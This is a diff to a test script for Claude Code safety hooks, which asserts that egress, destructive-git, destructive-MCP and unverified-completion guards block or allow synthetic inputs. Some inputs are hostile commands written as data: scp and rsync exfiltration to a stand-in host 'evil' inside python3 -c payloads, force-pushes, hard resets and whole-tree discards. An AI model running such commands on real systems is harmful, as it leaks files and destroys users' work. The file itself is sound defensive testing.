@@ -8,10 +8,12 @@
 # and blocking nothing). This turns the README's manual test recipe into an enforced gate
 # (#40, #41).
 #
-# Two layers:
+# Three layers:
 #   1. py_compile every tracked *.py — catches syntax / import-time breakage (#40).
 #   2. feed synthetic hook-input JSON to each live hook and assert the exit code
 #      (2 = block, 0 = allow), the contract hooks/README.md documents by hand (#41).
+#   3. real-shape fixture corpus — drive each hook against redacted real Claude Code
+#      transcripts/PreToolUse payloads under tests/fixtures/ (#117).
 #
 # Lives OUTSIDE home/.claude/ on purpose: install.sh symlinks that tree into the user's live
 # config, so repo-/CI-only tooling must not live there (CLAUDE.md). Run: bash tests/test_hooks.sh
@@ -61,12 +63,16 @@ assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"Explor
 assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":"claude","model":"haiku","prompt":"x"}}' "allows an explicit model="
 assert_exit 0 "$RDM" '{"tool_name":"Bash","tool_input":{}}'                                                    "ignores non-Agent tools"
 assert_exit 0 "$RDM" 'not-json'                                                                                "fails open on malformed JSON"
+assert_exit 0 "$RDM" '[1,2,3]'                                                                                 "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$RDM" '{"tool_name":"Agent","tool_input":[1,2,3]}'                                              "fails open on non-object tool_input (#318)"
+assert_exit 2 "$RDM" '{"tool_name":"Agent","tool_input":{"subagent_type":{"foo":"bar"},"prompt":"x"}}'         "coerces a non-string subagent_type to generic instead of crashing with TypeError (#272)"
 
 echo "== verify-completion-claim.py =="
 VCC="$HOOKS/verify-completion-claim.py"
 assert_exit 0 "$VCC" '{"stop_hook_active":true}'                    "self-limits when stop_hook_active is set"
 assert_exit 0 "$VCC" '{"transcript_path":"/nonexistent/xyz.jsonl"}' "fails open on an unreadable transcript"
 assert_exit 0 "$VCC" 'not-json'                                     "fails open on malformed JSON"
+assert_exit 0 "$VCC" '[1,2,3]'                                      "fails open on valid-but-non-object top-level JSON (#318)"
 
 # Real transcript shapes for /verify via the Skill and SlashCommand tools, captured against a
 # live Claude Code session (#109): a Skill invocation serializes as tool_use name="Skill" with
@@ -176,6 +182,58 @@ bash_verify_transcript="$(build_transcript_records '[
 ]')"
 assert_exit 0 "$VCC" "{\"transcript_path\":\"$bash_verify_transcript\"}" "does not block a completion claim after an actual Bash tool_use ran npm test (#83)"
 rm -f "$bash_verify_transcript"
+
+# #329: `bash -n` only parses a script for syntax errors, it never executes any logic — it must
+# not count as verification evidence for a completion claim.
+bash_n_transcript="$(build_transcript_records '[
+  {"message": {"role": "user", "content": "please fix the bug"}},
+  {"message": {"role": "assistant", "content": [
+    {"type": "tool_use", "name": "Edit", "input": {"file_path": "install.sh"}}
+  ]}},
+  {"message": {"role": "user", "content": [
+    {"type": "tool_result", "tool_use_id": "t1", "content": "ok"}
+  ]}},
+  {"message": {"role": "assistant", "content": [
+    {"type": "tool_use", "name": "Bash", "input": {"command": "bash -n install.sh"}}
+  ]}},
+  {"message": {"role": "user", "content": [
+    {"type": "tool_result", "tool_use_id": "t2", "content": "(no output)"}
+  ]}},
+  {"message": {"role": "assistant", "content": "Fixed the bug, all done."}}
+]')"
+assert_exit 2 "$VCC" "{\"transcript_path\":\"$bash_n_transcript\"}" "blocks a completion claim backed only by a syntax-only 'bash -n' check, not real execution (#329)"
+rm -f "$bash_n_transcript"
+
+# #108: a completion word sitting inside a tool_use's own INPUT (a Bash command, a file edit's
+# new text) must not trip CLAIM — only the assistant's own prose (type=='text' blocks) counts.
+tool_input_claim_transcript="$(build_transcript_records '[
+  {"message": {"role": "user", "content": "please commit the fix"}},
+  {"message": {"role": "assistant", "content": [
+    {"type": "tool_use", "name": "Edit", "input": {"file_path": "foo.py", "new_string": "resolved = True\n"}}
+  ]}},
+  {"message": {"role": "user", "content": [
+    {"type": "tool_result", "tool_use_id": "t1", "content": "ok"}
+  ]}},
+  {"message": {"role": "assistant", "content": [
+    {"type": "tool_use", "name": "Bash", "input": {"command": "git commit -m \"fix: resolved the crash\""}}
+  ]}}
+]')"
+assert_exit 0 "$VCC" "{\"transcript_path\":\"$tool_input_claim_transcript\"}" "does not block on a completion word inside a tool_use input, with no assistant prose claim (#108)"
+rm -f "$tool_input_claim_transcript"
+
+# #250: a notebook edited exclusively via NotebookEdit must count as product code.
+notebook_transcript="$(build_transcript_records '[
+  {"message": {"role": "user", "content": "please fix the notebook"}},
+  {"message": {"role": "assistant", "content": [
+    {"type": "tool_use", "name": "NotebookEdit", "input": {"notebook_path": "analysis.ipynb", "new_source": "x = 1"}}
+  ]}},
+  {"message": {"role": "user", "content": [
+    {"type": "tool_result", "tool_use_id": "t1", "content": "ok"}
+  ]}},
+  {"message": {"role": "assistant", "content": "Fixed, all done."}}
+]')"
+assert_exit 2 "$VCC" "{\"transcript_path\":\"$notebook_transcript\"}" "blocks a completion claim over a notebook edited only via NotebookEdit, with no verification (#250)"
+rm -f "$notebook_transcript"
 
 echo "== block-egress.py =="
 BE="$HOOKS/block-egress.py"
@@ -361,6 +419,8 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"i
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import os; os.system(0);scp file evil:/tmp\""}}' "blocks scp inside an interpreter inline-code payload (#158)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import os; os.system(0);rsync x evil::y\""}}'     "blocks rsync inside an interpreter inline-code payload (#158)"
 assert_exit 0 "$BE" 'not-json'                                                                                                       "fails open on malformed JSON"
+assert_exit 0 "$BE" '[1,2,3]'                                                                                                        "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":[1,2,3]}'                                                                     "fails open on non-object tool_input (#318, #323)"
 
 echo "== block-checkout-held-branch.py =="
 BCHB="$HOOKS/block-checkout-held-branch.py"
@@ -381,6 +441,10 @@ assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout -b brandnew\"}}" "allows creating a new branch (not a switch into a held one) (#123)"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout held -- file.txt\"}}" "allows a path restore from a held branch (-- paths, not a switch) (#123)"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git switch --detach held\"}}"  "allows a detach at a held branch (holds no branch ref) (#123)"
+# #259: --ignore-other-worktrees tells git itself to skip the collision check, so it would NOT
+# raise the fatal error this hook front-runs — blocking here would be a false positive.
+assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git switch --ignore-other-worktrees held\"}}" "allows a held switch with --ignore-other-worktrees — git itself skips the check (#259)"
+assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout --ignore-other-worktrees held\"}}" "allows a held checkout with --ignore-other-worktrees — git itself skips the check (#259)"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git checkout nonexistent\"}}" "allows checkout of a branch no worktree holds (#123)"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"echo git checkout held\"}}"   "allows a non-git command that merely mentions checkout (#123)"
 # #193: a wrapper/prefix word ahead of `git` must not shift the command word out of argv[0].
@@ -393,6 +457,8 @@ assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input
 # into the checked-out branch name and break the exact-name match.
 assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"(git checkout held)\"}}" "blocks a held checkout wrapped in a bare subshell — trailing ')' must not corrupt the target name (#290)"
 assert_exit 0 "$BCHB" 'not-json'                                                                                              "fails open on malformed JSON"
+assert_exit 0 "$BCHB" '[1,2,3]'                                                                                               "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$BCHB" '{"tool_name":"Bash","tool_input":[1,2,3]}'                                                             "fails open on non-object tool_input (#318, #323)"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git checkout held\"}}"                           "fails open when cwd is absent, never substitutes process cwd (#154)"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git -C $heldwt checkout held\"}}" "allows a -C-redirected checkout instead of consulting the wrong repo's cwd (#154)"
 # #211: bare `--exec-path` (no `=`) takes no value in real git — it must not be treated as
@@ -432,6 +498,8 @@ assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"! while sleep
 # shellcheck disable=SC2016
 assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while ! test -f /tmp/ready; do echo \"waiting $(sleep 5)\"; done"}}' "blocks a sleep hidden inside \$(...) in a loop piece (#200)"
 assert_exit 0 "$BSL" 'not-json'                                                                                      "fails open on malformed JSON"
+assert_exit 0 "$BSL" '[1,2,3]'                                                                                       "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$BSL" '{"tool_name":"Bash","tool_input":[1,2,3]}'                                                     "fails open on non-object tool_input (#318, #323)"
 assert_exit 0 "$BSL" '{"tool_name":"Agent","tool_input":{"command":"while true; do sleep 5; done"}}'                 "ignores a non-Bash tool_name"
 
 echo "== block-suppressed-stderr.py =="
@@ -453,6 +521,8 @@ assert_exit 0 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x
 # #205: `2>&-` closes fd 2 outright — same practical effect as redirecting it to /dev/null.
 assert_exit 2 "$BSS" '{"tool_name":"Bash","tool_input":{"command":"curl http://x 2>&-"}}'                            "blocks the 2>&- fd-close idiom (#205)"
 assert_exit 0 "$BSS" 'not-json'                                                                                      "fails open on malformed JSON"
+assert_exit 0 "$BSS" '[1,2,3]'                                                                                       "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$BSS" '{"tool_name":"Bash","tool_input":[1,2,3]}'                                                     "fails open on non-object tool_input (#318, #323)"
 assert_exit 0 "$BSS" '{"tool_name":"Agent","tool_input":{"command":"curl http://x 2>/dev/null"}}'                    "ignores a non-Bash tool_name"
 
 echo "== block-destructive-git.py =="
@@ -535,6 +605,37 @@ assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\"
 # discard-everything exact-match check.
 echo y >> "$dgrepo/f.txt"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"(git checkout -- .)\"}}"          "blocks checkout -- . wrapped in a bare subshell — trailing ')' must not corrupt the '.' match (#290)"
+# #320: "." unions with any other pathspec rather than intersecting, so an extra pathspec after
+# "." still discards the whole tree — it must not escape the exact-match ["."] check.
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout -- . b.txt\"}}"       "blocks checkout -- . <extra pathspec> — '.' still discards everything (#320)"
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git restore . b.txt\"}}"           "blocks restore . <extra pathspec> — '.' still discards everything (#320)"
+git -C "$dgrepo" checkout -q -- f.txt
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout -- . b.txt\"}}"       "allows checkout -- . <extra pathspec> on a clean tree — nothing to discard (#320)"
+
+# #347: --pathspec-from-file supplies the discard pathspec via a file instead of argv — a bare
+# '.' inside the referenced file must be read the same conservative, fail-open way
+# _working_tree_dirty() already shells out to git. Live-verified: git only honors this flag
+# BEFORE a `--` (after `--` it's a literal, unmatched pathspec and git errors with nothing
+# discarded), so these cases omit `--`.
+printf '.\n' > "$dgrepo/discard.txt"
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout --pathspec-from-file=discard.txt\"}}"   "allows checkout --pathspec-from-file=<file containing .> on a clean tree — nothing to discard (#347)"
+echo y >> "$dgrepo/f.txt"
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout --pathspec-from-file=discard.txt\"}}"   "blocks checkout --pathspec-from-file=<file containing .> discarding a tracked change (#347)"
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout --pathspec-from-file discard.txt\"}}"    "blocks the separate-token --pathspec-from-file <file> form too (#347)"
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git restore --pathspec-from-file=discard.txt\"}}"    "blocks restore --pathspec-from-file=<file containing .> discarding a tracked change (#347)"
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout -- --pathspec-from-file=discard.txt\"}}" "allows the post-'--' form — git itself errors there and discards nothing (#347)"
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout --pathspec-from-file=-\"}}"              "allows --pathspec-from-file=- (stdin) — not read by the hook, fails open (#347)"
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout --pathspec-from-file=does-not-exist.txt\"}}" "allows an unreadable --pathspec-from-file target — fails open (#347)"
+printf 'f.txt\n' > "$dgrepo/single.txt"
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git checkout --pathspec-from-file=single.txt\"}}"     "allows --pathspec-from-file naming one file, not a whole-tree discard (#347)"
+git -C "$dgrepo" checkout -q -- f.txt
+rm -f "$dgrepo/discard.txt" "$dgrepo/single.txt"
+
+# git switch --discard-changes: same discard-everything semantics as checkout -- ./restore .,
+# expressed as a flag rather than a pathspec (#259).
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git switch --discard-changes main\"}}"   "allows switch --discard-changes on a clean tree — nothing to discard (#259)"
+echo y >> "$dgrepo/f.txt"
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git switch --discard-changes main\"}}"   "blocks switch --discard-changes discarding an uncommitted tracked change (#259)"
 git -C "$dgrepo" checkout -q -- f.txt
 
 # git push -f / --force: needs a real remote to reason about fast-forward-ness.
@@ -559,6 +660,13 @@ git -C "$dgrepo" add a.txt
 git -C "$dgrepo" -c user.email=t@t -c user.name=t commit -q -m "divergent commit"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -f origin scratch\"}}"  "blocks a force-push that would discard commits on the remote (#230)"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin +scratch:refs/heads/scratch\"}}" "blocks a force-push whose refspec destination is fully-qualified (refs/heads/...), not just a short name (#261)"
+# #319: a bare `HEAD` refspec (no colon) resolves to the current branch's real name — must not be
+# read as a literal branch called "HEAD", which would check refs/remotes/origin/HEAD (the remote's
+# default-branch symref, unset here) instead of the actual diverged destination.
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin HEAD --force\"}}" "blocks a force-push via a bare 'origin HEAD' refspec that would discard remote commits — HEAD resolves to the real destination branch (#319)"
+# #326: `@` is git's documented synonym for `HEAD` in revision/refspec contexts and hits the same
+# literal-branch-name bug #319 fixed for `HEAD`.
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin @ --force\"}}" "blocks a force-push via a bare 'origin @' refspec that would discard remote commits — '@' resolves to the real destination branch, same as HEAD (#326)"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -uf origin scratch\"}}" "blocks a bundled -uf (set-upstream+force) push that would discard commits (#235)"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -fu origin scratch\"}}" "blocks a bundled -fu push that would discard commits (#235)"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -f -o ci.skip origin scratch\"}}" "blocks a force-push with a push-option value token after -f, before the refs (#237)"
@@ -590,6 +698,8 @@ assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"sudo git push -f origin scratch\"}}" "blocks a destructive push behind a sudo prefix (#230)"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"echo git reset --hard\"}}"       "allows a non-git command that merely mentions reset --hard (#230)"
 assert_exit 0 "$BDG" 'not-json'                                                                                                  "fails open on malformed JSON (#230)"
+assert_exit 0 "$BDG" '[1,2,3]'                                                                                                   "fails open on valid-but-non-object top-level JSON (#318)"
+assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":[1,2,3]}'                                                                 "fails open on non-object tool_input (#318, #323)"
 assert_exit 0 "$BDG" '{"tool_name":"Agent","tool_input":{"command":"git reset --hard"}}'                                         "ignores a non-Bash tool_name (#230)"
 assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"git reset --hard"}}'                                          "fails open when cwd is absent, never substitutes process cwd (#230)"
 
@@ -661,6 +771,9 @@ chmod +x "$dgghstub/gh"
 dgoldpath="$PATH"
 PATH="$dgghstub:$PATH"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin main\"}}"        "blocks a direct push to a branch GitHub reports as protected (#252)"
+git -C "$dgrepo" checkout -q main
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin HEAD\"}}"        "blocks a bare 'git push origin HEAD' (no colon) push whose destination resolves to the protected branch's real name, not a literal branch called HEAD (#319)"
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin @\"}}"           "blocks a bare 'git push origin @' (no colon) push whose destination resolves to the protected branch's real name, not a literal branch called '@' (#326)"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch\"}}"     "allows a push to a branch GitHub does NOT report as protected (#252)"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin HEAD:main\"}}"   "blocks a push whose refspec destination resolves to the protected branch name (#252)"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin :main\"}}"       "allows a delete-refspec push — no content pushed, out of scope (#252)"
@@ -672,6 +785,104 @@ rm -rf "$dgghstub"
 
 rm -rf "$dgrepo" "$dgremote"
 
+echo "== block-destructive-mcp.py (#260) =="
+BDM="$HOOKS/block-destructive-mcp.py"
+assert_exit 2 "$BDM" '{"tool_name":"mcp__plugin_github_github__merge_pull_request","tool_input":{}}'    "blocks a namespaced GitHub-plugin merge tool (#260)"
+assert_exit 2 "$BDM" '{"tool_name":"mcp__plugin_github_github__delete_file","tool_input":{}}'            "blocks a namespaced GitHub-plugin delete tool (#260)"
+assert_exit 2 "$BDM" '{"tool_name":"mcp__plugin_github_github__push_files","tool_input":{}}'             "blocks a namespaced GitHub-plugin push tool (#260)"
+assert_exit 2 "$BDM" '{"tool_name":"mcp__plugin_cloudflare_cloudflare-bindings__r2_bucket_delete","tool_input":{}}' "blocks a namespaced Cloudflare delete tool by verb, independent of the exact-name deny (#260)"
+assert_exit 2 "$BDM" '{"tool_name":"mcp__memory__force_reset","tool_input":{}}'                          "blocks a non-plugin (bare server) MCP tool matching a Tier-A verb (#260)"
+assert_exit 2 "$BDM" '{"tool_name":"mcp__some_server__deploy-service","tool_input":{}}'                  "blocks a hyphen-separated Tier-A verb token (#260)"
+assert_exit 2 "$BDM" '{"tool_name":"mcp__plugin_github_github__mergePullRequest","tool_input":{}}'       "blocks a camelCase Tier-A verb token (#355)"
+assert_exit 2 "$BDM" '{"tool_name":"mcp__plugin_github_github__deleteFile","tool_input":{}}'              "blocks another camelCase Tier-A verb token (#355)"
+assert_exit 0 "$BDM" '{"tool_name":"mcp__plugin_github_github__createRepository","tool_input":{}}'        "allows a camelCase create tool — not a Tier-A verb (#355)"
+assert_exit 0 "$BDM" '{"tool_name":"mcp__plugin_github_github__create_repository","tool_input":{}}'      "allows a create tool — not a Tier-A verb (#260)"
+assert_exit 0 "$BDM" '{"tool_name":"mcp__plugin_github_github__list_pull_requests","tool_input":{}}'     "allows a read/list tool (#260)"
+assert_exit 0 "$BDM" '{"tool_name":"mcp__plugin_github_github__get_file_contents","tool_input":{}}'      "allows a get tool (#260)"
+assert_exit 0 "$BDM" '{"tool_name":"Bash","tool_input":{"command":"git push -f"}}'                       "ignores a non-mcp tool_name (#260)"
+assert_exit 0 "$BDM" 'not-json'                                                                          "fails open on malformed JSON (#260)"
+assert_exit 0 "$BDM" '[1,2,3]'                                                                           "fails open on valid-but-non-object top-level JSON (#260)"
+assert_exit 0 "$BDM" '{"tool_name":123,"tool_input":{}}'                                                 "fails open on a non-string tool_name (#260)"
+
+# #358: consolidated MCP tools bundle a destructive action behind a method/action parameter in
+# tool_input instead of the tool name itself — offending_verb() alone can't see it.
+assert_exit 2 "$BDM" '{"tool_name":"mcp__plugin_github_github__label_write","tool_input":{"method":"delete","label":"bug"}}' "blocks a consolidated tool's destructive method in tool_input (#358)"
+assert_exit 0 "$BDM" '{"tool_name":"mcp__plugin_github_github__label_write","tool_input":{"method":"create","label":"bug"}}' "allows a consolidated tool's non-Tier-A method in tool_input (#358)"
+assert_exit 0 "$BDM" '{"tool_name":"mcp__plugin_github_github__label_write","tool_input":{"method":"update","label":"bug"}}' "allows a consolidated tool's update method in tool_input (#358)"
+assert_exit 2 "$BDM" '{"tool_name":"mcp__plugin_github_github__pull_request_review_write","tool_input":{"method":"delete"}}' "blocks pull_request_review_write's bundled delete method (#358)"
+assert_exit 0 "$BDM" '{"tool_name":"mcp__plugin_github_github__pull_request_review_write","tool_input":{"method":"submit"}}' "allows pull_request_review_write's bundled submit method — not Tier-A (#358)"
+assert_exit 2 "$BDM" '{"tool_name":"mcp__plugin_github_github__discussion_comment_write","tool_input":{"method":"delete"}}' "blocks discussion_comment_write's bundled delete method (#358)"
+assert_exit 0 "$BDM" '{"tool_name":"mcp__plugin_github_github__discussion_comment_write","tool_input":{"method":"add"}}' "allows discussion_comment_write's bundled add method (#358)"
+assert_exit 2 "$BDM" '{"tool_name":"mcp__some_server__generic_write","tool_input":{"action":"forceDelete"}}' "blocks a camelCase Tier-A verb bundled in an 'action' field, not just 'method' (#358)"
+assert_exit 0 "$BDM" '{"tool_name":"mcp__plugin_github_github__label_write","tool_input":{"method":123}}'  "fails open on a non-string method field (#358)"
+assert_exit 0 "$BDM" '{"tool_name":"mcp__plugin_github_github__label_write","tool_input":"not-an-object"}' "fails open on a non-dict tool_input (#358)"
+assert_exit 0 "$BDM" '{"tool_name":"mcp__plugin_github_github__label_write"}'                              "fails open on a missing tool_input (#358)"
+
+echo "== audit-git-consequences.py (#236 PostToolUse consequence audit) =="
+AGC="$HOOKS/audit-git-consequences.py"
+assert_exit 0 "$AGC" 'not-json'                                                                    "fails open on malformed JSON (#236)"
+assert_exit 0 "$AGC" '[1,2,3]'                                                                     "fails open on valid-but-non-object top-level JSON (#236)"
+assert_exit 0 "$AGC" '{"tool_name":"Edit","tool_input":{}}'                                        "ignores a non-Bash tool_name (#236)"
+assert_exit 0 "$AGC" '{"tool_name":"Bash","cwd":"/nonexistent-not-a-repo","tool_input":{"command":"echo hi"}}' "fails open on a cwd that is not a git repo (#236)"
+
+agcrepo="$(mktemp -d)"
+git -C "$agcrepo" init -q -b main
+git -C "$agcrepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
+assert_exit 0 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"echo hi\"}}" "first call seen for a repo has no baseline yet — always allow, just records the snapshot (#236)"
+git -C "$agcrepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m second
+assert_exit 0 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"git commit --allow-empty -m second\"}}" "a fast-forward commit since the last snapshot is not flagged (#236)"
+git -C "$agcrepo" reset -q --hard HEAD~1
+assert_exit 2 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"git reset --hard HEAD~1\"}}" "a hard reset that discards a commit unreachable from any other ref is flagged (#236)"
+
+git -C "$agcrepo" checkout -q -b feature
+git -C "$agcrepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m "feature work"
+git -C "$agcrepo" checkout -q main
+assert_exit 0 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"git checkout main\"}}" "baseline call after creating a new unmerged branch — records it, nothing destructive yet (#236)"
+git -C "$agcrepo" branch -D feature
+assert_exit 2 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"git branch -D feature\"}}" "deleting a branch whose tip commit is unreachable from any other ref is flagged (#236)"
+
+git -C "$agcrepo" checkout -q -b feature2
+git -C "$agcrepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m "feature2 work"
+git -C "$agcrepo" checkout -q main
+git -C "$agcrepo" merge -q feature2
+assert_exit 0 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"git merge feature2\"}}" "baseline call after merging feature2 into main (#236)"
+git -C "$agcrepo" branch -d feature2
+assert_exit 0 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"git branch -d feature2\"}}" "deleting a fully-merged branch is not flagged — its tip is still reachable via main (#236)"
+
+# #339: a `merge-base --is-ancestor` subprocess failure (e.g. a pruned/invalid old_sha object) must
+# degrade to "couldn't tell" (no alarm), not fall through to the reachability check as if it were
+# a definitively-non-fast-forward move.
+git -C "$agcrepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m "prune-target"
+assert_exit 0 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"echo hi\"}}" "baseline call recording the commit that will be pruned (#339 setup)"
+git -C "$agcrepo" reset -q --hard HEAD~1
+git -C "$agcrepo" reflog expire --expire=now --all
+git -C "$agcrepo" gc -q --prune=now
+assert_exit 0 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"git reset --hard HEAD~1\"}}" "a merge-base failure on a pruned/invalid object degrades to unknown, not a false alarm (#339)"
+
+# #343: a `git branch -a --contains` subprocess failure in _reachable() (same pruned-object cause)
+# must degrade to "couldn't tell" (no alarm) instead of being indistinguishable from "genuinely
+# not reachable".
+git -C "$agcrepo" checkout -q -b prune-branch
+git -C "$agcrepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m "prune-branch work"
+git -C "$agcrepo" checkout -q main
+assert_exit 0 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"git checkout main\"}}" "baseline call recording the branch that will be deleted and pruned (#343 setup)"
+git -C "$agcrepo" branch -D prune-branch
+git -C "$agcrepo" reflog expire --expire=now --all
+git -C "$agcrepo" gc -q --prune=now
+assert_exit 0 "$AGC" "{\"tool_name\":\"Bash\",\"cwd\":\"$agcrepo\",\"tool_input\":{\"command\":\"git branch -D prune-branch\"}}" "a _reachable() failure on a pruned/invalid object degrades to unknown, not a false alarm (#343)"
+
+# #351: a commit kept alive only by a tag (no branch containing it) must still read as reachable,
+# not as discarded.
+git -C "$agcrepo" checkout -q -b tag-branch
+git -C "$agcrepo" -c user.email=t@t -c user.name=t commit -q --allow-empty -m "tag-branch work"
+git -C "$agcrepo" tag keepme
+git -C "$agcrepo" checkout -q main
